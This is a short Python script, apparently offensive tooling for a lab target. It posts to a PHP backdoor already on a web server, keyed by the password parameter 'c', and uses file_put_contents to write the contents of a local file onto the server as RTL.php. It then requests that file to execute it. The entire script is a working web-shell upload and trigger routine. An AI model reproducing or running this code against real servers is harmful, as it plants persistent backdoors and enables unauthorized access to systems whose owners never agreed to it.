# -*- coding:utf8 -*-
# Author: RTL
# Date: 2019.02.20

v_ip = "http://192.168.142.132/"
p = "c"

import requests

def UploadFile(url, passwd):
  file = open('code.txt')
  code = file.read()
  file_content = 'file_put_contents("RTL.php", "%s");' % code
  #print file_content
  j = {
    passwd : file_content
  }
  res = requests.post(url, data=j)

def TouchFile(url):
  try:
    res = requests.get(url, timeout=0.1)
    print res.text
  except:
    print v_ip, "Success!"

if __name__ == "__main__":
  UploadFile(v_ip, p)
  TouchFile(v_ip + "RTL.php")


